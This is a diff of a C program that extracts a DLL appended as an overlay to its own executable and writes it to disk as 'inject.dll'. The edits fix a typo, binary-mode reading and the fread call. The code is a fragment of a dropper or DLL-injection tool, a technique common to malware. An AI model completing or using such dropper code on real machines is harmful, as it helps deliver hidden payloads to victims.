@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdio.h>
 
+
 typedef void* HANDLE;
 
 size_t dllSize = 0;
@@ -105,7 +106,7 @@ int getSizeOfPeFile(){
 }   
 
 void getOverlay(){
-    int offsetOfOvelray = getSizeOfPeFile();
+    int offsetOfOverlay = getSizeOfPeFile();
     char *fileName = (char *)malloc(MAX_PATH);
     GetModuleFileNameA(NULL,fileName,MAX_PATH);
     if( strlen(fileName) == 0){
@@ -113,7 +114,7 @@ void getOverlay(){
         exit(EXIT_FAILURE);
     }
 
-    FILE *fp = fopen(fileName, "r"); // read mode
+    FILE *fp = fopen(fileName, "rb"); // read mode
 
     if (fp == NULL){
         perror("Error while opening the file.\n");
@@ -123,7 +124,7 @@ void getOverlay(){
 
     long int sizeOfFile = ftell(fp);
 
-    if ( fseek(fp, offsetOfOvelray, SEEK_SET) != 0 ) {
+    if ( fseek(fp, offsetOfOverlay, SEEK_SET) != 0 ) {
         perror("Could not set the file position.\n");
         exit(EXIT_FAILURE);
     }
@@ -132,7 +133,7 @@ void getOverlay(){
 
     dll = (char *)malloc(dllSize);
 
-    fread(dll, 16, dllSize/16, fp);
+    fread(dll, 1, dllSize, fp);
 
     fclose(fp);
 }
@@ -140,7 +141,7 @@ void getOverlay(){
 //create DLL on disks
 char* dropDll(){
     HANDLE hFile;
-    char *fileName = "dll.dll";
+    char *fileName = "inject.dll";
 
     getOverlay();
 
